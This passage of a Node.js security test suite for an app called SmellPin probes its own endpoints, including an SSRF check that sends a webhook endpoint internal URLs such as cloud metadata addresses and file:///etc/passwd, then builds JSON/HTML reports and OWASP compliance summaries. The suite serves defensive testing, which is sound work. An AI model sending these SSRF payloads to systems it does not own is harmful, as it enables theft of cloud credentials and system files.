          const geoResponse = await httpClient.get('/api/geocoding/search', {
            params: { q: input }
          });

          if (geoResponse.data && geoResponse.data.results) {
            // 检查是否返回了异常结果
            if (geoResponse.data.results.length > 0) {
              logSecurityIssue(
                'INTEGRATION',
                '地理编码输入验证不足',
                '地理编码API未正确验证输入',
                RISK_LEVELS.MEDIUM,
                { maliciousInput: input },
                '对地理编码API输入进行严格验证'
              );
            }
          }
        } catch (error) {
          // Continue testing
        }
      }
    } catch (error) {
      logSecurityIssue('INTEGRATION', '无法测试地图API安全性', error.message, RISK_LEVELS.INFO);
    }

    // 测试3: 外部API调用安全
    try {
      // 检查是否存在SSRF漏洞
      const ssrfUrls = [
        'http://localhost:22',
        'http://127.0.0.1:3000',
        'http://metadata.google.internal/',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd'
      ];

      for (const url of ssrfUrls) {
        try {
          const response = await httpClient.post('/api/webhook/test', {
            url: url
          }, {
            headers: { Authorization: 'Bearer fake_token' }
          });

          if (response.status === 200 && response.data.success) {
            logSecurityIssue(
              'INTEGRATION',
              'SSRF漏洞风险',
              `系统可能允许访问内部资源: ${url}`,
              RISK_LEVELS.HIGH,
              { ssrfUrl: url },
              '限制外部URL访问，使用白名单机制'
            );
          }
        } catch (error) {
          // Continue testing
        }
      }
    } catch (error) {
      logSecurityIssue('INTEGRATION', '无法测试SSRF漏洞', error.message, RISK_LEVELS.INFO);
    }

  } catch (error) {
    console.error('第三方集成安全测试出错:', error.message);
  }
}

/**
 * 生成安全测试报告
 */
async function generateSecurityReport() {
  console.log('\n📊 生成安全测试报告...\n');

  SECURITY_REPORT.metadata.endTime = new Date();
  SECURITY_REPORT.metadata.duration = SECURITY_REPORT.metadata.endTime - SECURITY_REPORT.metadata.startTime;

  // 计算风险分数
  const totalRiskScore = [
    ...SECURITY_REPORT.vulnerabilities,
    ...SECURITY_REPORT.warnings,
    ...SECURITY_REPORT.passed
  ].reduce((sum, issue) => sum + issue.riskLevel.score, 0);

  const criticalCount = SECURITY_REPORT.vulnerabilities.filter(v => v.riskLevel.level === 'CRITICAL').length;
  const highCount = SECURITY_REPORT.vulnerabilities.filter(v => v.riskLevel.level === 'HIGH').length;
  const mediumCount = [...SECURITY_REPORT.vulnerabilities, ...SECURITY_REPORT.warnings].filter(v => v.riskLevel.level === 'MEDIUM').length;

  // 生成报告
  const report = {
    ...SECURITY_REPORT,
    summary: {
      totalTests: SECURITY_REPORT.vulnerabilities.length + SECURITY_REPORT.warnings.length + SECURITY_REPORT.passed.length,
      vulnerabilitiesCount: SECURITY_REPORT.vulnerabilities.length,
      warningsCount: SECURITY_REPORT.warnings.length,
      passedCount: SECURITY_REPORT.passed.length,
      riskScore: totalRiskScore,
      criticalIssues: criticalCount,
      highRiskIssues: highCount,
      mediumRiskIssues: mediumCount,
      overallRisk: criticalCount > 0 ? 'CRITICAL' : 
                  highCount > 0 ? 'HIGH' : 
                  mediumCount > 0 ? 'MEDIUM' : 'LOW'
    },
    recommendations: generateRecommendations(),
    compliance: checkCompliance()
  };

  // 保存报告
  await fs.writeFile(
    '/Users/xiaoyang/Downloads/臭味/security-test-report.json', 
    JSON.stringify(report, null, 2)
  );

  // 生成HTML报告
  const htmlReport = generateHTMLReport(report);
  await fs.writeFile(
    '/Users/xiaoyang/Downloads/臭味/security-test-report.html', 
    htmlReport
  );

  // 输出摘要
  console.log('\n' + '='.repeat(80));
  console.log(colors.bold.cyan('SmellPin 安全测试报告摘要'));
  console.log('='.repeat(80));
  console.log(`测试时间: ${SECURITY_REPORT.metadata.startTime.toISOString()}`);
  console.log(`测试持续时间: ${Math.round(report.metadata.duration / 1000)}秒`);
  console.log(`总测试数: ${report.summary.totalTests}`);
  console.log(colors.red(`严重漏洞: ${report.summary.criticalIssues}`));
  console.log(colors.magenta(`高风险问题: ${report.summary.highRiskIssues}`));
  console.log(colors.yellow(`中风险问题: ${report.summary.mediumRiskIssues}`));
  console.log(colors.green(`通过测试: ${report.summary.passedCount}`));
  console.log(`总体风险等级: ${colors[getRiskColor(report.summary.overallRisk)](report.summary.overallRisk)}`);
  console.log('\n' + '='.repeat(80));

  return report;
}

/**
 * 生成修复建议
 */
function generateRecommendations() {
  const recommendations = [];

  // 基于发现的漏洞生成建议
  const allIssues = [...SECURITY_REPORT.vulnerabilities, ...SECURITY_REPORT.warnings];
  
  const criticalIssues = allIssues.filter(i => i.riskLevel.level === 'CRITICAL');
  if (criticalIssues.length > 0) {
    recommendations.push({
      priority: 'IMMEDIATE',
      title: '立即修复严重安全漏洞',
      description: '发现严重安全漏洞，需要立即修复以防止潜在的安全攻击',
      actions: criticalIssues.map(i => i.recommendation).filter(Boolean)
    });
  }

  const authIssues = allIssues.filter(i => i.type === 'AUTH');
  if (authIssues.length > 0) {
    recommendations.push({
      priority: 'HIGH',
      title: '加强身份验证和授权机制',
      description: '改进用户身份验证和访问控制系统',
      actions: [
        '实施多因素认证(MFA)',
        '加强JWT令牌安全性',
        '定期审查用户权限',
        '实施会话超时机制'
      ]
    });
  }

  const injectionIssues = allIssues.filter(i => i.type === 'INJECTION');
  if (injectionIssues.length > 0) {
    recommendations.push({
      priority: 'HIGH',
      title: '防护注入攻击',
      description: '加强输入验证和查询安全性',
      actions: [
        '使用参数化查询防止SQL注入',
        '实施严格的输入验证',
        '使用ORM框架的安全特性',
        '定期进行代码安全审查'
      ]
    });
  }

  // 通用安全建议
  recommendations.push({
    priority: 'MEDIUM',
    title: '安全配置最佳实践',
    description: '实施行业标准的安全配置',
    actions: [
      '配置安全HTTP头',
      '启用HTTPS并配置HSTS',
      '实施内容安全策略(CSP)',
      '定期更新依赖包',
      '配置错误监控和日志记录'
    ]
  });

  return recommendations;
}

/**
 * 合规性检查
 */
function checkCompliance() {
  const compliance = {};

  // OWASP Top 10检查
  compliance.owaspTop10 = {
    'A01:2021 - Broken Access Control': checkBrokenAccessControl(),
    'A02:2021 - Cryptographic Failures': checkCryptographicFailures(),
    'A03:2021 - Injection': checkInjection(),
    'A04:2021 - Insecure Design': checkInsecureDesign(),
    'A05:2021 - Security Misconfiguration': checkSecurityMisconfiguration(),
    'A06:2021 - Vulnerable Components': checkVulnerableComponents(),
    'A07:2021 - Authentication Failures': checkAuthenticationFailures(),
    'A08:2021 - Software Integrity Failures': checkSoftwareIntegrityFailures(),
    'A09:2021 - Security Logging Failures': checkSecurityLoggingFailures(),
    'A10:2021 - Server-Side Request Forgery': checkSSRF()
  };

  // 数据隐私合规(GDPR/CCPA基础要求)
  compliance.dataPrivacy = {
    passwordSecurity: !SECURITY_REPORT.vulnerabilities.some(v => v.type === 'PRIVACY' && v.title.includes('密码')),
    dataEncryption: true, // 需要更详细的检查
    accessControl: !SECURITY_REPORT.vulnerabilities.some(v => v.title.includes('权限')),
    dataMinimization: true // 需要更详细的检查
  };

  return compliance;
}

// 辅助函数用于合规性检查
function checkBrokenAccessControl() {
  return !SECURITY_REPORT.vulnerabilities.some(v => 
    v.type === 'AUTH' || v.title.includes('权限') || v.title.includes('访问')
  );
}

function checkCryptographicFailures() {
  return !SECURITY_REPORT.vulnerabilities.some(v => 
    v.title.includes('密码') || v.title.includes('加密') || v.title.includes('HTTPS')
  );
}

function checkInjection() {
  return !SECURITY_REPORT.vulnerabilities.some(v => v.type === 'INJECTION');
}

function checkInsecureDesign() {
  return SECURITY_REPORT.vulnerabilities.filter(v => v.riskLevel.level === 'CRITICAL').length === 0;
}

function checkSecurityMisconfiguration() {
  return !SECURITY_REPORT.vulnerabilities.some(v => 
    v.type === 'TRANSMISSION' || v.title.includes('配置') || v.title.includes('头')
  );
}

function checkVulnerableComponents() {
  return true; // 需要依赖扫描工具
}

function checkAuthenticationFailures() {
  return !SECURITY_REPORT.vulnerabilities.some(v => v.type === 'AUTH');
}

function checkSoftwareIntegrityFailures() {
  return true; // 需要更详细的检查
}

function checkSecurityLoggingFailures() {
  return true; // 需要检查日志配置
}

function checkSSRF() {
  return !SECURITY_REPORT.vulnerabilities.some(v => v.title.includes('SSRF'));
}

/**
 * 生成HTML报告
 */
function generateHTMLReport(report) {
  return `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SmellPin 安全测试报告</title>
    <style>
        body { font-family: 'Microsoft YaHei', Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 8px 8px 0 0; }
        .content { padding: 30px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .stat-card { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #007bff; }
        .stat-number { font-size: 2em; font-weight: bold; color: #333; }
        .stat-label { color: #666; margin-top: 5px; }
        .critical { border-left-color: #dc3545; }
        .high { border-left-color: #fd7e14; }
        .medium { border-left-color: #ffc107; }
        .low { border-left-color: #28a745; }
        .issue { margin: 20px 0; padding: 20px; border-radius: 8px; border-left: 4px solid #ddd; }
        .issue.critical { border-left-color: #dc3545; background: #fff5f5; }
        .issue.high { border-left-color: #fd7e14; background: #fff8f0; }
        .issue.medium { border-left-color: #ffc107; background: #fffdf0; }
        .issue.low { border-left-color: #17a2b8; background: #f0f9ff; }
        .issue-title { font-weight: bold; margin-bottom: 10px; }
        .issue-description { margin-bottom: 10px; }
        .recommendation { background: #e8f5e8; padding: 15px; border-radius: 5px; margin-top: 10px; }
        .section { margin: 30px 0; }
        .section h2 { border-bottom: 2px solid #eee; padding-bottom: 10px; }
        pre { background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .compliance-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .compliance-item { padding: 15px; border-radius: 8px; }
        .compliance-pass { background: #d4edda; border: 1px solid #c3e6cb; }
        .compliance-fail { background: #f8d7da; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 SmellPin 安全测试报告</h1>
            <p>生成时间: ${new Date().toLocaleString('zh-CN')}</p>
            <p>测试持续时间: ${Math.round(report.metadata.duration / 1000)}秒</p>
        </div>
        
        <div class="content">
            <div class="section">
                <h2>📊 测试摘要</h2>
                <div class="summary">
                    <div class="stat-card critical">
                        <div class="stat-number">${report.summary.criticalIssues}</div>
                        <div class="stat-label">严重漏洞</div>
                    </div>
                    <div class="stat-card high">
                        <div class="stat-number">${report.summary.highRiskIssues}</div>
                        <div class="stat-label">高风险问题</div>
                    </div>
                    <div class="stat-card medium">
                        <div class="stat-number">${report.summary.mediumRiskIssues}</div>
                        <div class="stat-label">中风险问题</div>
                    </div>
                    <div class="stat-card low">
                        <div class="stat-number">${report.summary.passedCount}</div>
                        <div class="stat-label">通过测试</div>
                    </div>
                </div>
            </div>

            ${report.vulnerabilities.length > 0 ? `
            <div class="section">
                <h2>🚨 发现的安全漏洞</h2>
                ${report.vulnerabilities.map(v => `
                <div class="issue ${v.riskLevel.level.toLowerCase()}">
                    <div class="issue-title">[${v.riskLevel.level}] ${v.title}</div>
                    <div class="issue-description">${v.description || ''}</div>
                    ${v.evidence ? `<pre>${JSON.stringify(v.evidence, null, 2)}</pre>` : ''}
                    ${v.recommendation ? `<div class="recommendation"><strong>修复建议:</strong> ${v.recommendation}</div>` : ''}
                </div>
                `).join('')}
            </div>` : ''}

            ${report.warnings.length > 0 ? `
            <div class="section">
                <h2>⚠️ 安全警告</h2>
                ${report.warnings.map(w => `
                <div class="issue ${w.riskLevel.level.toLowerCase()}">
                    <div class="issue-title">[${w.riskLevel.level}] ${w.title}</div>
                    <div class="issue-description">${w.description || ''}</div>
                    ${w.recommendation ? `<div class="recommendation"><strong>建议:</strong> ${w.recommendation}</div>` : ''}
                </div>
                `).join('')}
            </div>` : ''}

            <div class="section">
                <h2>💡 修复建议</h2>
                ${report.recommendations.map(r => `
                <div class="issue ${r.priority.toLowerCase()}">
                    <div class="issue-title">[${r.priority}] ${r.title}</div>
                    <div class="issue-description">${r.description}</div>
                    <ul>
                        ${r.actions.map(action => `<li>${action}</li>`).join('')}
                    </ul>
                </div>
                `).join('')}
            </div>

            <div class="section">
                <h2>📋 合规性检查</h2>
                <h3>OWASP Top 10</h3>
                <div class="compliance-grid">
                    ${Object.entries(report.compliance.owaspTop10).map(([key, value]) => `
                    <div class="compliance-item ${value ? 'compliance-pass' : 'compliance-fail'}">
                        <strong>${key}</strong><br>
                        状态: ${value ? '✅ 通过' : '❌ 未通过'}
                    </div>
                    `).join('')}
                </div>
            </div>
        </div>
    </div>
</body>
</html>`;
}

/**
 * 获取风险等级颜色
 */
function getRiskColor(level) {
  const colors = {
    'CRITICAL': 'red',
    'HIGH': 'magenta',
    'MEDIUM': 'yellow',
    'LOW': 'blue'
  };
  return colors[level] || 'white';
}

/**
 * 主测试函数
 */
async function runSecurityTests() {
  console.log(colors.bold.cyan('🔐 SmellPin 安全测试套件启动'));
  console.log(colors.gray(`测试目标: ${TEST_CONFIG.baseURL}`));
  console.log(colors.gray(`开始时间: ${new Date().toLocaleString('zh-CN')}`));
  console.log('='.repeat(80));

  try {
    await testAuthenticationSecurity();
    await testDataTransmissionSecurity();
    await testInputValidationAndSQLInjection();
    await testXSSAndCSRFProtection();
    await testAPISecurity();
    await testUserDataPrivacy();
    await testThirdPartyIntegrationSecurity();
    
    const report = await generateSecurityReport();
    
    console.log(colors.bold.green('\n✅ 安全测试完成!'));
    console.log(colors.cyan(`报告已保存到: security-test-report.json`));
    console.log(colors.cyan(`HTML报告已保存到: security-test-report.html`));
    
    // 如果发现严重漏洞，返回错误码
    if (report.summary.criticalIssues > 0) {
      console.log(colors.bold.red('\n⚠️  发现严重安全漏洞，需要立即修复!'));
      process.exit(1);
    }
    
  } catch (error) {
    console.error(colors.red('安全测试执行出错:'), error);
    process.exit(1);
  }
}

// 如果直接运行此脚本
if (require.main === module) {
  runSecurityTests();
}

module.exports = {
  runSecurityTests,
  testAuthenticationSecurity,
  testDataTransmissionSecurity,
  testInputValidationAndSQLInjection,
  testXSSAndCSRFProtection,
  testAPISecurity,
  testUserDataPrivacy,
  testThirdPartyIntegrationSecurity
};